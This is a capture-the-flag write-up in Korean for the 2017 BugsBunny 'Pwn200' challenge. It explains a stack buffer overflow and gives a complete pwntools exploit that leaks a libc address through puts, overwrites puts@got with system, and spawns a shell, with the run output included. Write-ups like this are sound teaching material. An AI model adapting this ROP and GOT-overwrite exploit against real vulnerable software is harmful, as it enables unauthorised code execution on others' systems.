# 2017 bugsbunny - [PWN] Pwn200

## Key words

- overwrite got

## Check Security

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

## Solution

```
ssize_t lOL()
{
  int buf; // [sp+0h] [bp-18h]@1
  int v2; // [sp+4h] [bp-14h]@1
  int v3; // [sp+8h] [bp-10h]@1
  int v4; // [sp+Ch] [bp-Ch]@1

  buf = 0;
  v2 = 0;
  v3 = 0;
  v4 = 0;
  return read(0, &buf, 0x80u);
}
```

이번 문제 역시 스택 버퍼오버플로우가 발생하는 예제 입니다. `NX`가 꺼져있기 때문에 간단하게 `bss` 영역에 쉘코드를 올리고 뛰어도 되지만 조금 다르게 해보도록 하겠습니다.

먼저 `puts`를 이용하여 `__libc_start_main@got`를 노출 시켜 라이브러리 베이스 주소를 구하고 이를 이용하여 `system` 주소를 구합니다. `bss`영역에 `/bin/sh\x00`을 써놓고 `puts@got`를 `system`주소로 변경한 뒤, `puts(bss)`를 하게 되면 결국엔 `system("/bin/sh\x00")`이 호출되게 되어 쉘을 획득 할 수 있습니다.

## Exploit Code

```python
from pwn import *

target = "./pwn200"

p    = process(target)
e    = ELF(target)

pppr = 0x08048599
pr   = pppr + 2
bss  = 0x0804a000

print p.recv()

payload = "A" * 0x18 + "B" * 4
payload += p32(e.plt['puts'])
payload += p32(pr)
payload += p32(e.got['__libc_start_main'])
payload += p32(e.plt['read'])
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)
payload += p32(e.plt['read'])
payload += p32(pppr)
payload += p32(0)
payload += p32(e.got['puts'])
payload += p32(4)
payload += p32(e.plt['puts'])
payload += p32(pr)
payload += p32(bss)

p.sendline(payload)

recv = p.recv().split("\n")[-2][:4]
libc_base = u32(recv) - 0x18540
system = libc_base + 0x3a940

log.info("libc base : {}".format(hex(libc_base)))
log.info("system    : {}".format(hex(system)))

p.send("/bin/sh\x00")
p.send(p32(system))
p.interactive()
```

## Result

```
tbkim@ubuntu:~/ctf/pwnable/0015_2017_bugsbunny_pwn200$ python sol_pwn200.py 
[+] Starting local process './pwn200': pid 5482
[*] '/home/tbkim/ctf/pwnable/0015_2017_bugsbunny_pwn200/pwn200'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
Welcome to BugsBunnyCTF!
Its all easy you should solve it :D?

[*] libc base : 0xf754b000
[*] system    : 0xf7585940
[*] Switching to interactive mode
$ id
uid=1000(tbkim) gid=1000(tbkim) groups=1000(tbkim)
```